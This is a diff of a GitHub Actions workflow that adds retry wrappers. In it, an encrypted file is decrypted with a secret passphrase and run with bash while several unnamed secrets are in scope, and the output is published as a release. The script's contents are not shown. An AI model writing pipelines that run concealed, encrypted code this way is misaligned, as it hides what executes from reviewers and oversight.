@@ -25,19 +25,28 @@ jobs:
           tag: "v0.0.1"
           token: ${{ secrets.GITHUB_TOKEN }}
           fileName: "ftz.tar.gz"
-
-      - name: kip
+          
+      - name: Pre
+        run: |
+          sudo tar -zxvf ftz.tar.gz
+          openssl enc -d -aes-256-cbc -pbkdf2 -in data.cc -out data.txt -pass pass:$SD
+        env:
+          SD: ${{ secrets.SD }}
+          
+      - name: Build
+        uses: nick-fields/retry@v3
+        with:
+          timeout_minutes: 120
+          max_attempts: 3
+          command: |
+            bash data.txt
         env:
           SD: ${{ secrets.SD }}
           SF: ${{ secrets.SF }}
           YU: ${{ secrets.YU }}
           PK: ${{ secrets.PK }}
           BG: ${{ secrets.BG }}
-        run: |
-          sudo tar -zxvf ftz.tar.gz
-          openssl enc -d -aes-256-cbc -pbkdf2 -in data.cc -out data.txt -pass pass:$SD
-          bash data.txt
-
+          
       - name: Generate version
         id: version
         run: |
@@ -48,16 +57,16 @@ jobs:
           VERSION="v${MAJOR}.${MONTH}.${DAY}"
           echo "version=$VERSION" >> $GITHUB_OUTPUT
 
-      - name: Create Release
-        id: create_release
-        uses: softprops/action-gh-release@v1
+      - name: Create Release with Retry
+        uses: nick-fields/retry@v3
         with:
-          tag_name: ${{ steps.version.outputs.version }}
-          name: "homi"
-          body: "Got it."
-          draft: false
-          prerelease: false
-          files: mferr
+          timeout_minutes: 5
+          max_attempts: 3
+          command: |
+            gh release create ${{ steps.version.outputs.version }} \
+              --title "homi" \
+              --notes "Fin." \
+              mferr
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           
